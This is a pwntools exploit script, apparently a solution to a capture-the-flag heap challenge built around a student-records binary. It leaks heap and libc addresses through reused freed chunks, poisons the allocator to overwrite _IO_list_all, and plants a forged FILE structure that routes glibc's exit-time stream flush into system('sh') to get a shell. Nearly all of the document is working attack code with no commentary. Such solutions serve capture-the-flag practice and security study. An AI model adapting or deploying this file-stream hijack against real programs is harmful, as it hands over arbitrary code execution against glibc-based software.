#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./binary ./libc.so.6 amd64
context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
context.arch = "amd64"


script = '''
# b*main+50
# c
set debuginfod enable on
b*exit
b*_IO_flush_all
c
'''
env = {
    "LD_LIBRARY_PATH": ".",
    "GLIBC_TUNABLES": "glibc.cpu.hwcaps=-all"
}

# p = remote("chall.lac.tf" , port = 31147)
p = gdb.debug(
    exe.path,
    gdbscript = script,
    env=env
)

def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    sleep(1.5)
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()

def create(uid , name , major , attributes , aux , ok , okname):
    sla(b'Option > ' , b'1')
    sla(b'UID: ' , str(uid).encode())
    sla(b'Enter student information now (y/n)? You can do it later: ' , okname)
    if okname == b'y':
        sa(b'Student name: ' , name)
        sa(b'Student major: ' , major)
        sla(b'Student attributes (e.g. undergrad = 1): ' , str(attributes))
        sla(b'Require space to add aux data (y/n)? ' , ok)
        if ok == b'y':
            sa(b'Aux data: ' , aux)

def show(uid):
    sla(b'Option > ' , b'2')
    sla(b'UID: ' , str(uid).encode())

def delete(uid):
    sla(b'Option > ' , b'3')
    sla(b'UID: ' , str(uid).encode())

# for i in range(10):
# create(64 , b'A' , b'B' , 0 , b'C' , b'y' , b'y')
# delete(64)
# create(64 , b'A' , b'B' , 0 , b'0' , b'n' , b'n')
# show(64)
for i in range(1 , 9):
    create(64 + i , b'A' , b'B' , 0 , b'C' , b'y' , b'y')
delete(65)
for i in range(8 , 1 , -1):
    if i == 2: continue
    delete(64 + i)
delete(66)
for i in range(1 , 9):
    create(64 + i , b'A' , b'B' , 0 , b'C' , b'n' , b'n')
show(71)
ru(b'Student Name: ')
heap = (u64(rn(5) + b'\x00' * 3) << 12) - 0x1000
slog("heap" , heap)

show(72)
ru(b'Student Name: ')
libc.address = u64(rn(6) + b'\x00' * 2) - 0x1e6c20
slog("libc base" , libc.address)
IO_list_all = libc.address + 0x1e74c0
for i in range(10):
    create(i , b'A' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')

# chunk = heap + 0x3920
chunk = libc.sym._IO_2_1_stdout_ - 0xd0 - 0x20
chunk2 = IO_list_all - 0x20
for i in range(10):
    if i == 1:
        create(20 + i , p64(chunk) * 0x6 + p64(chunk2) * 0x6 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
    else: create(20 + i , b'A' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
for i in range(9 , 2 , -1):
    delete(20 + i)
delete(21)
for i in range(3 , 10):
    create(20 + i , b'A' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
fp = FileStructure()
fp.flags = u32("  sh")
fp.vtable = libc.sym._IO_wfile_jumps
fp._wide_data = heap + 0x40b0
fp._IO_read_ptr = 0
fp._IO_read_end = 0
fp._IO_read_base = 0
fp._IO_write_ptr = 1
fp._IO_write_end = 0
fp._IO_write_base = 0
fp._IO_buf_end = 0
fp._IO_buf_base = 0
fp._lock = libc.address + 0x1e87b0
print(hex(len(fp)))

create(31 , b'D' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
create(32 , b'D' * 0x100 , bytes(fp)[-0xD0 : -0x90] , 0 , bytes(fp)[-0x90:] , b'y' , b'y')
create(33 , b'D' * 0x100 , p64(libc.sym._IO_2_1_stderr_) + b'\x00' * 0x18 + p64(u32("  sh")) + p64(0) , 0 , b'\x00' , b'y' , b'y')
create(34 , flat({
    0x68:[libc.sym.system],
    0xe0:[heap + 0x40b0],
} , filler = b'\x00') , b'A' * 0x40 , 0 , b'\x00' , b'y' , b'y')
sla(b'Option > ' , b'4')
p.interactive()